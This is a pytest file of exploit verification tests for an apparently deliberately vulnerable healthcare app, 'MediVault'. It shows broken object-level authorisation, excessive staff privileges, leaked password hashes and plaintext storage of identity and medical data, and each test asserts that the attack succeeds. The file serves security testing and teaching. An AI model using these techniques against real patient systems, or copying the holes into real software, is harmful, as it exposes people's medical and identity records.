"""MediVault Exploit Verification Tests: Access Control & Data Exposure (V01–V04).

Asserts reproducible exploits for:
- V01: Broken Object-Level Authorisation (IDOR / BOLA)
- V02: Excessive Staff Privileges
- V03: Excessive Data Exposure in API
- V04: Weak Storage Protection
"""

import pytest
from sqlalchemy import text
from backend.app.database import get_db
from backend.app.main import app


def get_token(client, email: str = "patient01@example.test", password: str = "Password123!") -> str:
    """Helper to authenticate and retrieve access token."""
    login_resp = client.post(
        "/api/auth/login",
        json={"email": email, "password": password},
    )
    assert login_resp.status_code == 200, f"Authentication failed for {email}: {login_resp.text}"
    return login_resp.json()["access_token"]


# ============================================================================
# V01: Broken Object-Level Authorisation (IDOR / BOLA)
# ============================================================================
def test_exploit_v01_idor_bola(client):
    """V01 Exploit: Patient A can read Patient B's profile and reports by changing patient_id in URL."""
    # Authenticate as Patient 01
    token_p1 = get_token(client, email="patient01@example.test")
    headers_p1 = {"Authorization": f"Bearer {token_p1}"}

    # Exploit: Request Patient 02's profile
    idor_profile_resp = client.get("/api/patients/PAT-DEMO-002", headers=headers_p1)
    assert idor_profile_resp.status_code == 200, (
        f"Expected 200 due to missing BOLA check, got {idor_profile_resp.status_code}"
    )
    p2_data = idor_profile_resp.json()
    assert p2_data["patient_id"] == "PAT-DEMO-002"
    assert p2_data["full_name"] == "Priya Patel"
    assert p2_data["conditions"] == "Asthma"

    # Exploit: Request Patient 02's medical reports
    idor_reports_resp = client.get("/api/patients/PAT-DEMO-002/reports", headers=headers_p1)
    assert idor_reports_resp.status_code == 200, (
        f"Expected 200 due to missing BOLA check on reports, got {idor_reports_resp.status_code}"
    )
    assert isinstance(idor_reports_resp.json(), list)


# ============================================================================
# V02: Excessive Staff Privileges
# ============================================================================
def test_exploit_v02_excessive_staff_privileges(client):
    """V02 Exploit: Front desk staff (staff_basic) can access restricted clinical consult notes."""
    # Authenticate as front desk receptionist (staff_basic)
    token_reception = get_token(client, email="reception@example.test")
    headers_reception = {"Authorization": f"Bearer {token_reception}"}

    # Exploit: Front desk staff requests confidential physician clinical notes
    clinical_resp = client.get(
        "/api/staff/patients/PAT-DEMO-002/clinical",
        headers=headers_reception,
    )
    assert clinical_resp.status_code == 200, (
        f"Expected 200 due to lack of role separation on clinical route, got {clinical_resp.status_code}"
    )
    clinical_data = clinical_resp.json()
    assert clinical_data["patient_id"] == "PAT-DEMO-002"
    assert "medical_notes" in clinical_data
    assert clinical_data["medical_notes"] is not None
    assert len(clinical_data["medical_notes"]) > 0
    assert "aadhaar_ref" in clinical_data


# ============================================================================
# V03: Excessive Data Exposure in API
# ============================================================================
def test_exploit_v03_excessive_data_exposure(client):
    """V03 Exploit: Profile endpoint leaks bcrypt password hash and unmasked identity reference."""
    # Authenticate as Patient 01
    token_p1 = get_token(client, email="patient01@example.test")
    headers_p1 = {"Authorization": f"Bearer {token_p1}"}

    # Exploit: Inspect own profile endpoint payload
    resp = client.get("/api/patients/me", headers=headers_p1)
    assert resp.status_code == 200
    payload = resp.json()

    # Verify sensitive fields are leaked in response
    assert "password_hash" in payload, "password_hash missing from response"
    assert payload["password_hash"] is not None
    assert payload["password_hash"].startswith("$2b$"), (
        f"Expected bcrypt hash string, got {payload['password_hash'][:10]}..."
    )
    assert payload["aadhaar_ref"] == "DEMO-AADHAAR-0001"
    assert "medical_notes" in payload

    # Exploit combined with V01: Read Patient 02's leaked password hash
    p2_resp = client.get("/api/patients/PAT-DEMO-002", headers=headers_p1)
    assert p2_resp.status_code == 200
    p2_payload = p2_resp.json()
    assert "password_hash" in p2_payload
    assert p2_payload["password_hash"] is not None
    assert p2_payload["password_hash"].startswith("$2b$")


# ============================================================================
# V04: Weak Storage Protection
# ============================================================================
def test_exploit_v04_weak_storage_protection(client):
    """V04 Exploit: Identity references and medical notes are stored as readable plaintext in SQLite."""
    token_p1 = get_token(client, email="patient01@example.test")
    headers_p1 = {"Authorization": f"Bearer {token_p1}"}

    # Update profile with confidential PII/PHI
    test_aadhaar = "1002 8888 7777"
    test_pmjay = "PMJAY-8888-7777"
    test_notes = "Confidential psychiatric consultation notes: prescribed SSRI regimen."

    update_resp = client.put(
        "/api/patients/PAT-DEMO-001",
        headers=headers_p1,
        json={
            "aadhaar_ref": test_aadhaar,
            "ayushman_ref": test_pmjay,
            "medical_notes": test_notes,
        },
    )
    assert update_resp.status_code == 200

    # Query the underlying SQLite database directly via the active dependency session
    db = next(app.dependency_overrides[get_db]())
    try:
        result = db.execute(
            text(
                "SELECT aadhaar_ref, ayushman_ref, medical_notes "
                "FROM patient_profiles WHERE patient_id = 'PAT-DEMO-001'"
            )
        ).fetchone()

        assert result is not None, "PatientProfile record not found in database"
        stored_aadhaar, stored_pmjay, stored_notes = result[0], result[1], result[2]

        # Confirm data is stored in unencrypted, raw readable plaintext
        assert stored_aadhaar == test_aadhaar, (
            f"Aadhaar reference is not stored in plaintext: {stored_aadhaar}"
        )
        assert stored_pmjay == test_pmjay, (
            f"Ayushman PM-JAY reference is not stored in plaintext: {stored_pmjay}"
        )
        assert stored_notes == test_notes, (
            f"Medical notes are not stored in plaintext: {stored_notes}"
        )
    finally:
        db.close()
